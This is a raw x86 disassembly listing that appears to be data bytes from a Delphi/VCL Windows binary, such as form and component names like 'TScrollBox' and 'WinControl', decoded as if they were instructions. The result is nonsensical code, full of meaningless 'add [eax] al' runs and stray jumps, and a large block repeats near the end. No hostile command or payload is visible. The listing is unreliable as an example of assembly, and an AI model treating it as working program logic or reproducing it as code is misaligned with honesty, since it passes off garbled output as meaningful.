push eax
outsd
jb r-xdata
push ds
0xa34de72b 0xcc30
push edi
imul ebp [ esi + 0x5 ] 0x6d726f46
imul edi [ edx + 0x65 ] 0x6c6f6f54
outsd
push ebx
arpl [ edx + 0x65 ] si
outsb
inc ebx
outsb
je r-xdata
add [ eax ] al
add eax [ eax ]
add [ eax ] al
sar bl 0x1
inc esp
popa
jne r-xdata
jb r-xdata
insb
jns r-xdata
jae r-xdata
bound ebp [ ecx + 0x53 ]
jns r-xdata
outsd
jb r-xdata
jo r-xdata
je r-xdata
inc edx
arpl [ edi + 0x6e ] bp
add [ eax ] eax
add [ eax ] al
or ah [ ebp + ebp * 2 + 0x4d ]
insd
push eax
jo r-xdata
jb r-xdata
je r-xdata
je r-xdata
inc esp
add [ ecx ] cl
insd
inc esp
jae r-xdata
add [ eax ] al
add al dl
sti
je r-xdata
outsb
insb
jns r-xdata
arpl [ edi + 0x6e ] bp
jae r-xdata
pshufw mm5 [ edi + 0x44 ] 0x65
jae r-xdata
jo r-xdata
inc esp
dec ecx
inc ebx
push 0x9646c69
jae r-xdata
inc esp
add [ esi ] al
or al 0x54
shl [ eax ] 0xfb
insb
je r-xdata
insb
jo r-xdata
push es
popad
insb
or ah [ esi + 0x73 ]
dec ebp
inc esi
outsd
dec ebp
popad
imul ebp [ esi + 0x46 ] 0x436d726f
outsb
je r-xdata
outsd
outsb
add [ eax ] eax
add [ eax ] al
add [ edi ] al
add [ eax ] al
add [ ebx + edi * 8 ] dh
inc esp
add [ edx ] cl
jo r-xdata
push es
add eax 0x6d726f46
jae r-xdata
nop
insd
popad
jb r-xdata
adc [ eax + 0x6f ] dh
jo r-xdata
inc esi
outsd
jb r-xdata
jae r-xdata
add ecx [ edi ]
push esp
imul edi [ edx + 0x65 ] 0x796c6e4f
cli
inc esp
add [ eax + r-xdata ] dl
add ecx [ ecx ]
push esp
int3
popad
dec ebp
je r-xdata
insd
imul edi [ edx + 0x65 ] 0x4d69620a
inc esp
dec ecx
inc esi
outsd
jb r-xdata
adc [ eax + 0x6f ] esi
jo r-xdata
outsb
or [ fs : eax + 0x6f ] esi
inc esp
popa
jne r-xdata
dec ebp
insd
jb r-xdata
jb r-xdata
jb r-xdata
inc esp
jae r-xdata
cld
inc eax
add [ eax + 0x80044fc ] bh
jb r-xdata
inc esp
add [ esi ] al
jo r-xdata
cld
inc esp
add [ ebx ] al
or edx [ eax + edx * 2 + 0x72 ]
imul ebp [ esi + 0x74 ] 0x6c616353
inc esp
add [ ebx ] al
or al 0x54
inc ebx
insb
outsd
jae r-xdata
arpl [ ecx + 0x4e ] sp
outsd
outsb
push es
arpl [ ecx + 0x48 ] sp
imul esp [ ebp + 0x6 ] 0x72466163
or ah [ gs : ebx + 0x61 ]
add [ eax ] al
add [ eax ] al
add eax [ eax ]
add [ eax ] al
insb
cld
inc esp
inc esp
jae r-xdata
add [ esi ] eax
jb r-xdata
or [ ebp + ebp * 2 + 0x50 ] esp
jo r-xdata
push cs
je r-xdata
jb r-xdata
jo r-xdata
outsd
jb r-xdata
or esp [ esi + 0x73 ]
push ebx
je r-xdata
inc esp
popa
inc esp
popa
jne r-xdata
jne r-xdata
aam 0xfb
je r-xdata
add eax 0x6d726f46
jo r-xdata
add [ gs : eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ esp + edi * 8 ] ah
arpl [ ecx + 0x6c ] sp
inc ebx
outsb
je r-xdata
inc esi
or edx [ ebx + eax * 2 + 0x6c ]
mov eax 0x80044fc
jo r-xdata
dec esi
outsd
outsb
push cs
inc ebx
insb
outsd
inc ebp
jbe r-xdata
jae r-xdata
jo r-xdata
outsb
or al 0x54
inc ebx
insb
outsd
jae r-xdata
outsd
add [ esi ] al
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
inc ebp
jbe r-xdata
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add [ ecx + edx ] al
inc eax
add [ esp + edi * 8 + 0x44 ] ch
add [ ebp - 0x303ffc0 ] cl
inc esp
add [ eax ] cl
adc [ ebx + eax * 2 + 0x6c ] dl
outsd
jae r-xdata
outsd
inc ebx
insb
push eax
jb r-xdata
outsd
outsb
imul esi [ edi + ebp * 2 + 0x72 ] 0x1
add [ eax ] eax
add [ eax ] al
add [ ebx ] al
inc ecx
arpl [ ecx + ebp * 2 + 0x76 ] si
or al 0x64
insd
add [ ebx ] al
add [ eax ] eax
add [ eax ] al
outsb
je r-xdata
jns r-xdata
popad
je r-xdata
jb r-xdata
inc esp
add [ ebx ] al
andps xmm0 [ ebp + 0x66 ]
sti
push esp
push eax
dec edi
ja r-xdata
outsb
je r-xdata
jb r-xdata
insd
popad
outsb
add al 0x57
outsd
jb r-xdata
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx ] al
inc eax
add [ eax ] al
adc [ eax ] al
nop
inc eax
std
inc esp
add [ eax ] cl
push cs
push esp
push ebx
push 0x4374726f
jne r-xdata
jae r-xdata
outsb
je r-xdata
jb r-xdata
outsd
insb
popad
outsb
outsb
je r-xdata
outsd
outsd
insb
push ecx
jne r-xdata
push es
arpl [ ecx + 0x46 ] sp
jb r-xdata
imul ebp [ esi + 0x46 ] 0xc6d726f
insd
jb r-xdata
bound ebp [ ecx + 0x48 ]
outsb
push esp
outsd
jo r-xdata
outsd
jae r-xdata
adc [ eax + 0x6f ] esi
jb r-xdata
add [ eax ] al
add [ esp + edi * 8 + 0x44 ] ch
inc esi
outsd
jb r-xdata
mov eax [ 0x2cf80041 ]
inc ebp
add [ esi + ebp + 0x33f40045 ] ch
inc eax
add [ eax ] bl
push ebx
inc ebp
mov al 0xf7
inc esp
add [ esp + eax * 2 ] al
popad
je r-xdata
outsb
add [ eax ] dl
inc eax
add [ eax ] al
push 0x3c004010
adc [ eax ] al
add [ eax ] dl
inc eax
add [ ebp - 0x1dfffc0 ] cl
add cl [ eax ]
push es
push ebx
outsb
jb r-xdata
or [ esi ] al
imul ebp [ edi + 0x6e ] 0x700c6c61
outsd
push eax
jb r-xdata
add al 0xa6
inc ebx
add ah dl
cmp al [ ebp ]
lodsb [ esi ]
enter 0x43 0x8c
or eax [ eax + eax + 0x48 ]
or al 0x44
add [ edi + eax + 0x44 ] al
add [ esp + ecx ] ch
inc esp
add [ edx + ebp + 0x45 ] ch
add [ eax + 0x41 ] bh
inc ebp
add al bh
loope r-xdata
add [ ebx + ebp + 0x45 ] ch
add [ ebx + edx + 0x18a00044 ] al
inc esp
add ah ch
pop ss
inc esp
add [ eax + ebx * 4 + 0xe000043 ] dh
inc esp
add [ edi + esi + 0x45 ] dh
add [ eax ] bh
or eax [ eax + eax - 0x4 ]
xchg edi eax
inc ebx
add [ eax ] al
cwde
inc ebx
add [ eax + 0x38 ] ch
inc ebp
add [ eax ] ch
enter 0x43 0x40
mov [ 0xffffffff99780043 ] eax
inc ebx
add ah cl
movsb [ edi ] [ esi ]
inc ebx
add [ edx + edi + 0x45 ] bl
add [ eax ] ch
cmp [ ebp ] eax
add dl [ ecx ]
add ecx [ ebp + 0x73 ]
push es
push esp
push edi
dec ebp
dec ebx
jns r-xdata
add [ ebp + edi * 8 + 0x44 ] bh
add [ eax ] cl
or dl [ eax + ecx * 2 + 0x65 ]
insb
inc esp
popad
outsb
add [ eax ] al
jb r-xdata
dec ebp
imul ebp [ esi + 0x69 ] 0x657a696d
add eax 0x6d726f46
jae r-xdata
or ah [ gs : ebx + 0x61 ]
inc esp
add [ ebx ] al
or edx [ edx + eax * 2 + 0x6f ]
jb r-xdata
lea eax [ eax ]
sar dl 0x1
inc esi
outsd
jb r-xdata
insd
outsd
add [ eax ] al
and al 0xfc
jae r-xdata
add al al
pop es
dec ecx
outsb
je r-xdata
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x6 ] si
outsb
je r-xdata
inc ebp
add [ esi + ecx * 2 ] bh
inc ebp
add [ ecx + edx * 2 + 0x50580045 ] bl
inc ebp
add [ eax - 0x6bffbc1e ] dl
loop r-xdata
dec eax
popad
outsb
insb
pop es
inc edx
pop es
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + edi * 8 ] dl
inc esp
add [ eax + 0x4500 ] bh
add [ eax ] al
cmp al 0x10
inc eax
add [ eax ] al
adc [ eax ] al
lea eax [ eax ]
and dh bh
jbe r-xdata
jo r-xdata
inc ebp
jbe r-xdata
jae r-xdata
sti
inc esp
add [ ebx ] al
or [ eax + edx * 2 + 0x6f ] edx
jae r-xdata
add [ eax ] dh
xor [ eax ] eax
dec esp
xor [ eax ] eax
adc al 0x2f
inc ebp
add [ eax + 0x18 ] dh
inc esp
add [ esp + esi + 0x46540045 ] al
inc ecx
add ah dl
xor [ ebp ] al
adc [ ecx ] dh
inc ebp
add [ edx + esi ] bl
inc ebp
add [ eax - 0x5d ] bl
inc ebx
add al bl
mov eax [ 0x3a940041 ]
inc ebp
add [ eax + 0x3400419e ] bh
jbe r-xdata
lodsb [ esi ]
inc ebp
add ah dh
xor eax [ eax ]
sbb [ ebx + 0x45 ] dl
jb r-xdata
cld
inc esp
add [ eax ] cl
outsd
inc esi
imul esi [ ebp + eax + 0x46 ] 0x736d726f
inc ebp
add [ eax + 0x3a ] bl
inc ebp
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax + edx + 0x23c0040 ] ah
add ah dl
push edx
inc ebp
add ah dh
loopne r-xdata
add [ eax ] al
add [ eax ] al
add [ esi ] dh
inc [ eax + eax - 0x5a ]
add [ ebp ] al
clc
add al [ eax ]
add [ eax - 0x3fffbb09 ] dh
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
adc [ eax ] al
jl r-xdata
outsb
je r-xdata
inc ebx
popad
insb
insb
dec eax
insb
jo r-xdata
or [ ebx + 0x61 ] al
add [ eax ] al
sbb dl bh
inc esp
add [ eax + 0x2 ] dl
add [ eax ] al
dec esp
cli
inc esp
add [ edx + eax ] ah
add [ 0x14000f00 ] bh
add [ edi ] ah
add [ edi ] dh
add [ ecx + 0x200a100 ] al
add [ ecx ] dl
add [ edi ] edx
add [ eax ] esp
add [ edi ] ebx
add [ esi ] eax
add [ eax ] dl
add [ ecx ] dl
add [ edx ] dl
add [ eax ] ebx
add [ edx ] ah
add ch [ eax ]
add [ ecx ] dl
add dl [ ebx ]
and al 0x0
sbb al [ eax ]
inc esi
add [ eax - 0x50 ] al
aas
mov al 0x0
mov al 0x17
mov al 0x3c
mov al 0x1
mov al 0x5
mov al 0xd
mov al 0x10
mov al 0xe
mov al 0x15
mov al 0x19
mov al 0x1d
mov al 0x21
mov al 0x12
mov al 0x29
mov al 0x3d
mov al 0x8
mov al 0x44
mov al 0xb3
push [ edx - 0x13001201 ]
push [ ecx - 0x50004f01 ]
[ esi - 0x52000201 ]
add [ eax ] al
add [ eax ] al
add eax [ eax ]
add [ eax ] al
movsb [ edi ] [ esi ]
adc [ eax ] al
cmp al 0x2
add [ edx + esi * 2 + 0x2d300045 ] bh
inc ebp
add al al
insd
inc ebp
add [ eax + 0x74004554 ] ah
outsd
add [ ebp + ecx + 0x44 ] ch
add al cl
pop ecx
inc ebp
add [ esi + ebx + 0x9e80044 ] ch
inc esp
add ah bl
outsb
inc ebp
add [ eax + 0x24 ] ah
inc ebp
add [ eax ] dl
daa
inc ebp
add [ edi + ebx * 2 + 0x2ff80045 ] bh
inc ebp
add [ eax + esi + 0x45 ] dh
add [ edi ] al
inc ebx
outsd
insd
add eax [ eax ]
pop es
add cl [ eax ]
push es
push ebx
outsb
jb r-xdata
pop es
inc edx
outsd
outsd
insb
popad
inc edx
outsd
add [ eax ] ecx
inc ebx
popad
outsb
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x8 ] si
sub_44f5f0
inc esp
add [ eax ] cl
add [ eax ] al
dec [ eax ]
add [ eax ] al
inc [ eax + 0x18 ]
inc ebp
add [ eax ] al
add [ eax ] al
or [ eax ] 0x0
add [ eax ] al
add al [ eax ]
or [ ecx + 0x6e ] ecx
arpl [ edx + 0x65 ] si
insd
outsb
je r-xdata
outsb
cmp al 0x10
inc eax
add [ eax ] dl
add [ eax ] al
push eax
and [ ebp ] al
add al 0x21
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
push es
add [ 0x676e6152 ] al
adc [ eax ] al
sbb al [ eax ]
add bh bh
sbb al [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add eax [ eax ]
push es
dec ebp
popad
jb r-xdata
add [ eax ] al
[ 0x1ff0000 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax [ eax ]
cmp al 0x10
inc eax
add [ eax ] dh
add [ eax ] al
jmp [ eax + 0x45 ]
inc eax
add [ edi ] bl
add [ eax ] al
[ edi ]
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
pop es
add [ esi ] al
popad
outsb
add [ gs : bx + si ] dl
imul ebp [ esi ] 0x2c004010
add [ eax ] al
dec [ eax + 0x100451f ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add al 0x0
or edx [ eax + 0x61 ]
jb r-xdata
add ah ch
xor eax [ eax ]
adc al 0x9b
add [ eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax - 0x9 ] ch
inc esp
add [ eax ] cl
ja r-xdata
push ebx
insd
outsd
outsd
je r-xdata
outsb
je r-xdata
adc eax 0xecb03c01
add al dh
and eax [ ebp ]
loopne r-xdata
sbb [ eax + eax - 0x68 ] al
loopne r-xdata
dec esi
outsd
jb r-xdata
outsd
insb
outsd
jb r-xdata
push esi
outsd
insb
nop
adc cl bh
inc esp
add [ edi ] al
adc al 0x54
push ebx
arpl [ edx + 0x6f ] si
inc esp
add [ eax + 0xc ] cl
inc esp
add [ edi + eax + 0x44 ] al
add [ esp + ecx ] ch
inc esp
add [ edx + ebp + 0x45 ] ch
add [ eax + 0x24 ] al
inc ebp
add al bh
loope r-xdata
mov [ ebx ] cs
inc ebx
add [ eax ] al
and al 0x45
add [ eax - 0x6bffbc1e ] dl
loop r-xdata
xchg edi eax
inc ebx
add [ eax ] al
cwde
inc ebx
add ah bh
mov [ ebx ] sub_43c828
inc eax
mov [ 0xffffffff99780043 ] eax
inc ebx
add ah cl
movsb [ edi ] [ esi ]
inc ebx
add [ esp + 0x43 ] al
add [ eax - 0x59 ] bl
inc ebx
add [ esi ] al
inc ebx
add [ edi + 0x43 ] ch
add [ eax + ecx * 8 + 0xb8c0043 ] ch
inc esp
add ah bh
add [ esi + eax * 8 ] ch
inc ebx
add [ eax - 0x66 ] al
inc ebx
add [ ebp + ecx * 8 + 0x43 ] cl
add [ eax - 0x5d ] bl
inc ebx
add al bl
mov eax [ 0xffffffff9ec00041 ]
add [ esi + eax * 2 + 0x41 ] dl
add [ eax + 0x18 ] dh
inc esp
add [ eax + 0x540043e0 ] bl
inc esi
inc ecx
popad
insb
or esi [ edi + 0x73 ]
dec ebp
imul ebp [ esi + 0x69 ] 0x657a696d
or esi [ fs : edi + 0x73 ]
dec ebp
popad
js r-xdata
add [ gs : eax ] dl
add eax 0x676e6152
adc [ eax ] al
or al 0x0
add bh bh
mov al [ 0x100451f ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add eax 0x6f500800
jae r-xdata
add [ ebx ] al
or al 0x54
inc edx
outsd
jb r-xdata
push ebx
arpl [ edx + 0x6f ] si
insb
insb
inc edx
jb r-xdata
outsd
insb
cld
test [ eax + eax - 0x34 ] 0xd004369
add [ 0x6d726f46 ] al
jae r-xdata
fsubr [ edx ]
inc ebp
add [ eax ] ah
sub [ ebp ] eax
add [ ecx + 0x43 ] cl
add ah dh
loopne r-xdata
inc ecx
add [ eax - 0x1fffbe62 ] bh
mov eax [ 0x233c0041 ]
inc ebp
add [ ebx + edx + 0x18a00044 ] al
inc esp
add ah ch
pop ss
inc esp
add [ eax + ebx * 4 + 0xe000043 ] dh
inc esp
add [ eax ] ah
push cs
inc esp
add [ eax ] bh
or eax [ eax + eax - 0x4 ]
inc eax
0xcd4c0043 0x43
pop eax
mov [ 0xffffffffa1d80043 ] eax
insd
imul edi [ edx + 0x65 ] 0x6f460564
jb r-xdata
add [ eax ] al
je r-xdata
shl ecx 0x2
int 0xda
push edx
rcl [ ecx ] 0x1
sahf
cmpsb [ esi ] [ edi ]
add [ eax ] ah
scasd [ edi ]
cmp eax 0x4605da82
outsd
jb r-xdata
jb r-xdata
jb r-xdata
stc
inc esp
add [ ebx ] al
adc [ esi + eax * 2 + 0x6f ] dl
jb r-xdata
jb r-xdata
je r-xdata
cmc
inc esp
add [ eax ] cl
add al [ eax ]
add [ eax + 0x80044f5 ] al
jb r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x560d000c ] al
insb
insb
imul ebp [ esi + 0x67 ] 0x436e6957
outsd
outsb
je r-xdata
and [ eax * 2 + 0x53541400 ] 0x63
jb r-xdata
inc eax
dec [ eax + 0x29 ]
inc ebp
add [ edx + ebp ] ah
inc ebp
add [ eax + 0x2a ] cl
inc ebp
add ah bl
sub al [ ebp ]
and [ ecx ] ch
inc ebp
add [ eax + 0x14004524 ] al
push esp
push ebx
arpl [ edx + 0x6f ] si
add [ ebp + ecx + 0x44 ] ch
add [ ebx + ebp * 8 ] bh
inc ebx
add [ esi + ebx + 0x9e80044 ] ch
inc esp
add al bl
or al 0x44
add [ eax + 0x24 ] ah
inc ebp
add [ eax ] dl
daa
inc ebp
add [ ecx + ebp + 0x45 ] al
add [ esi ] al
add [ 0x15011400 ] al
add [ eax + esi * 4 ] edi
in al dx
inc ecx
add al al
sahf
jae r-xdata
[ eax + 0x1004520 ]
outsd
add [ ebx ] al
add [ eax ] al
add ah cl
cli
inc esp
add [ edx ] cl
imul edx [ ebx + 0x79 ] 0x6d657473
jae r-xdata
or [ ecx + 0x4f ] cl
je r-xdata
popad
jb r-xdata
insb
insb
imul ebp [ esi + 0x67 ] 0x436e6957
outsd
outsb
je r-xdata
insb
add [ gs : eax ] eax
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + 0x50044f9 ] cl
inc esi
outsd
inc edx
outsd
jb r-xdata
inc eax
add [ ecx ] al
jae r-xdata
lea eax [ eax ]
sbb al 0xfa
insb
add [ gs : eax ] eax
add [ eax ] al
add [ 0xffffffff88000000 ] al
or [ edx + esi * 2 + 0x61 ] dl
arpl [ ebx + 0x69 ] bp
outsb
add [ bx + si ] dl
inc eax
add [ eax + eax ] bl
add bh bh
adc [ ecx ] ah
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or al 0x0
pop es
push esi
imul esi [ ebx + 0x69 ] 0x8d656c62
inc eax
add [ edi + esi * 8 + 0x44 ] ch
add [ ebx ] al
or al 0x54
push edi
imul ebp [ esi + 0x64 ] 0x7453776f
popad
je r-xdata
inc ecx
add ah dh
xor eax [ eax ]
shr al 0x1
inc ebx
add [ eax ] dh
xor [ eax ] eax
dec esp
xor [ eax ] eax
mov ah 0x23
inc ebp
sar ah 0xf7
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
stc
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dl
clc
inc esp
add dh dh
clc
inc esp
add [ edx + eax ] bl
add [ eax ] al
sbb [ esi + 0x43 ] ah
add al al
mov eax [ 0x33ec0041 ]
inc eax
add [ ebx + ebx * 4 ] dl
or ah [ edx + 0x69 ]
dec ebp
bound ebp [ ecx + 0x4d ]
imul ebp [ esi + 0x69 ] 0x657a696d
dec [ ebp - 0x57fffc0 ]
inc esp
add bh bh
insd
and al 0x11
add [ ebx ] al
lea eax [ eax ]
cmp dl 0x44
or dl [ esi + eax * 2 + 0x6f ]
jb r-xdata
jae r-xdata
jb r-xdata
outsd
insb
stc
inc esp
insb
inc esi
invd
dec ecx
dec edi
add bh bh
dec [ ebx + 0x44fa50c0 ]
add [ edi ] cl
jb r-xdata
imul edi [ edx + 0x65 ] 0x656c6261
or [ edx + 0x73 ] ah
inc esp
imul esp [ ecx + 0x6c ] 0x620c676f
jae r-xdata
dec edi
insd
imul edi [ edx + 0x65 ] 0x48696206
outsb
jne r-xdata
push ebx
je r-xdata
outsd
jb r-xdata
inc eax
add al dl
cli
stc
inc esp
add [ esi ] al
bound esi [ ebx + 0x4e ]
outsd
outsb
or [ gs : edx + 0x73 ] ah
push ebx
imul ebp [ esi + 0x67 ] 0x620a656c
jae r-xdata
add eax 0x88000000
inc esp
add [ edi ] cl
or eax 0x73654449
imul esp [ edi + 0x6e ] 0x6f487265
inc eax
add [ edx + edi * 8 ] bl
outsd
imul eax [ eax ] 0x28
inc ecx
add [ ecx ] al
movsd [ edi ] [ esi ]
sbb eax 0x2bea1e43
out 0x4d eax
mov [ 0xfffffffffd45cc30 ] eax
das
mov cl 0xec
add eax 0x6d726f46
jae r-xdata
dec eax
outsd
outsd
outsd
insb
push edi
imul ebp [ esi + 0x64 ] 0x620d776f
jae r-xdata
push cs
jo r-xdata
mov eax eax
and bl bh
inc esi
outsd
jb r-xdata
popad
js r-xdata
bound ebp [ ecx + 0x4d ]
insb
add [ gs : eax ] eax
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ edx + edi * 8 + 0x44 ] bh
add [ eax ] cl
jae r-xdata
push eax
outsd
jb r-xdata
push ds
0xa34de72b 0xcc30
push edi
imul ebp [ esi + 0x5 ] 0x6d726f46
imul edi [ edx + 0x65 ] 0x6c6f6f54
outsd
push ebx
arpl [ edx + 0x65 ] si
outsb
inc ebx
outsb
je r-xdata
add [ eax ] al
add eax [ eax ]
add [ eax ] al
sar bl 0x1
inc esp
popa
jne r-xdata
jb r-xdata
insb
jns r-xdata
jae r-xdata
bound ebp [ ecx + 0x53 ]
jns r-xdata
outsd
jb r-xdata
jo r-xdata
je r-xdata
inc edx
arpl [ edi + 0x6e ] bp
add [ eax ] eax
add [ eax ] al
or ah [ ebp + ebp * 2 + 0x4d ]
insd
push eax
jo r-xdata
jb r-xdata
je r-xdata
je r-xdata
inc esp
add [ ecx ] cl
insd
inc esp
jae r-xdata
add [ eax ] al
add al dl
sti
je r-xdata
outsb
insb
jns r-xdata
arpl [ edi + 0x6e ] bp
jae r-xdata
pshufw mm5 [ edi + 0x44 ] 0x65
jae r-xdata
jo r-xdata
inc esp
dec ecx
inc ebx
push 0x9646c69
jae r-xdata
inc esp
add [ esi ] al
or al 0x54
shl [ eax ] 0xfb
insb
je r-xdata
insb
jo r-xdata
push es
popad
insb
or ah [ esi + 0x73 ]
dec ebp
inc esi
outsd
dec ebp
popad
imul ebp [ esi + 0x46 ] 0x436d726f
outsb
je r-xdata
outsd
outsb
add [ eax ] eax
add [ eax ] al
add [ edi ] al
add [ eax ] al
add [ ebx + edi * 8 ] dh
inc esp
add [ edx ] cl
jo r-xdata
push es
add eax 0x6d726f46
jae r-xdata
nop
insd
popad
jb r-xdata
adc [ eax + 0x6f ] dh
jo r-xdata
inc esi
outsd
jb r-xdata
jae r-xdata
add ecx [ edi ]
push esp
imul edi [ edx + 0x65 ] 0x796c6e4f
cli
inc esp
add [ eax + r-xdata ] dl
add ecx [ ecx ]
push esp
int3
popad
dec ebp
je r-xdata
insd
imul edi [ edx + 0x65 ] 0x4d69620a
inc esp
dec ecx
inc esi
outsd
jb r-xdata
adc [ eax + 0x6f ] esi
jo r-xdata
outsb
or [ fs : eax + 0x6f ] esi
inc esp
popa
jne r-xdata
dec ebp
insd
jb r-xdata
jb r-xdata
jb r-xdata
inc esp
jae r-xdata
cld
inc eax
add [ eax + 0x80044fc ] bh
jb r-xdata
inc esp
add [ esi ] al
jo r-xdata
cld
inc esp
add [ ebx ] al
or edx [ eax + edx * 2 + 0x72 ]
imul ebp [ esi + 0x74 ] 0x6c616353
inc esp
add [ ebx ] al
or al 0x54
inc ebx
insb
outsd
jae r-xdata
arpl [ ecx + 0x4e ] sp
outsd
outsb
push es
arpl [ ecx + 0x48 ] sp
imul esp [ ebp + 0x6 ] 0x72466163
or ah [ gs : ebx + 0x61 ]
add [ eax ] al
add [ eax ] al
add eax [ eax ]
add [ eax ] al
insb
cld
inc esp
inc esp
jae r-xdata
add [ esi ] eax
jb r-xdata
or [ ebp + ebp * 2 + 0x50 ] esp
jo r-xdata
push cs
je r-xdata
jb r-xdata
jo r-xdata
outsd
jb r-xdata
or esp [ esi + 0x73 ]
push ebx
je r-xdata
inc esp
popa
inc esp
popa
jne r-xdata
jne r-xdata
aam 0xfb
je r-xdata
add eax 0x6d726f46
jo r-xdata
add [ gs : eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ esp + edi * 8 ] ah
arpl [ ecx + 0x6c ] sp
inc ebx
outsb
je r-xdata
inc esi
or edx [ ebx + eax * 2 + 0x6c ]
mov eax 0x80044fc
jo r-xdata
dec esi
outsd
outsb
push cs
inc ebx
insb
outsd
inc ebp
jbe r-xdata
jae r-xdata
jo r-xdata
outsb
or al 0x54
inc ebx
insb
outsd
jae r-xdata
outsd
add [ esi ] al
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
inc ebp
jbe r-xdata
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add [ ecx + edx ] al
inc eax
add [ esp + edi * 8 + 0x44 ] ch
add [ ebp - 0x303ffc0 ] cl
inc esp
add [ eax ] cl
adc [ ebx + eax * 2 + 0x6c ] dl
outsd
jae r-xdata
outsd
inc ebx
insb
push eax
jb r-xdata
outsd
outsb
imul esi [ edi + ebp * 2 + 0x72 ] 0x1
add [ eax ] eax
add [ eax ] al
add [ ebx ] al
inc ecx
arpl [ ecx + ebp * 2 + 0x76 ] si
or al 0x64
insd
add [ ebx ] al
add [ eax ] eax
add [ eax ] al
outsb
je r-xdata
jns r-xdata
popad
je r-xdata
jb r-xdata
inc esp
add [ ebx ] al
andps xmm0 [ ebp + 0x66 ]
sti
push esp
push eax
dec edi
ja r-xdata
outsb
je r-xdata
jb r-xdata
insd
popad
outsb
add al 0x57
outsd
jb r-xdata
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx ] al
inc eax
add [ eax ] al
adc [ eax ] al
nop
inc eax
std
inc esp
add [ eax ] cl
push cs
push esp
push ebx
push 0x4374726f
jne r-xdata
jae r-xdata
outsb
je r-xdata
jb r-xdata
outsd
insb
popad
outsb
outsb
je r-xdata
outsd
outsd
insb
push ecx
jne r-xdata
push es
arpl [ ecx + 0x46 ] sp
jb r-xdata
imul ebp [ esi + 0x46 ] 0xc6d726f
insd
jb r-xdata
bound ebp [ ecx + 0x48 ]
outsb
push esp
outsd
jo r-xdata
outsd
jae r-xdata
adc [ eax + 0x6f ] esi
jb r-xdata
add [ eax ] al
add [ esp + edi * 8 + 0x44 ] ch
inc esi
outsd
jb r-xdata
mov eax [ 0x2cf80041 ]
inc ebp
add [ esi + ebp + 0x33f40045 ] ch
inc eax
add [ eax ] bl
push ebx
inc ebp
mov al 0xf7
inc esp
add [ esp + eax * 2 ] al
popad
je r-xdata
outsb
add [ eax ] dl
inc eax
add [ eax ] al
push 0x3c004010
adc [ eax ] al
add [ eax ] dl
inc eax
add [ ebp - 0x1dfffc0 ] cl
add cl [ eax ]
push es
push ebx
outsb
jb r-xdata
or [ esi ] al
imul ebp [ edi + 0x6e ] 0x700c6c61
outsd
push eax
jb r-xdata
add al 0xa6
inc ebx
add ah dl
cmp al [ ebp ]
lodsb [ esi ]
enter 0x43 0x8c
or eax [ eax + eax + 0x48 ]
or al 0x44
add [ edi + eax + 0x44 ] al
add [ esp + ecx ] ch
inc esp
add [ edx + ebp + 0x45 ] ch
add [ eax + 0x41 ] bh
inc ebp
add al bh
loope r-xdata
add [ ebx + ebp + 0x45 ] ch
add [ ebx + edx + 0x18a00044 ] al
inc esp
add ah ch
pop ss
inc esp
add [ eax + ebx * 4 + 0xe000043 ] dh
inc esp
add [ edi + esi + 0x45 ] dh
add [ eax ] bh
or eax [ eax + eax - 0x4 ]
xchg edi eax
inc ebx
add [ eax ] al
cwde
inc ebx
add [ eax + 0x38 ] ch
inc ebp
add [ eax ] ch
enter 0x43 0x40
mov [ 0xffffffff99780043 ] eax
inc ebx
add ah cl
movsb [ edi ] [ esi ]
inc ebx
add [ edx + edi + 0x45 ] bl
add [ eax ] ch
cmp [ ebp ] eax
add dl [ ecx ]
add ecx [ ebp + 0x73 ]
push es
push esp
push edi
dec ebp
dec ebx
jns r-xdata
add [ ebp + edi * 8 + 0x44 ] bh
add [ eax ] cl
or dl [ eax + ecx * 2 + 0x65 ]
insb
inc esp
popad
outsb
add [ eax ] al
jb r-xdata
dec ebp
imul ebp [ esi + 0x69 ] 0x657a696d
add eax 0x6d726f46
jae r-xdata
or ah [ gs : ebx + 0x61 ]
inc esp
add [ ebx ] al
or edx [ edx + eax * 2 + 0x6f ]
jb r-xdata
lea eax [ eax ]
sar dl 0x1
inc esi
outsd
jb r-xdata
insd
outsd
add [ eax ] al
and al 0xfc
jae r-xdata
add al al
pop es
dec ecx
outsb
je r-xdata
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
push esp
dec edi
bound ebp [ edx + 0x65 ]
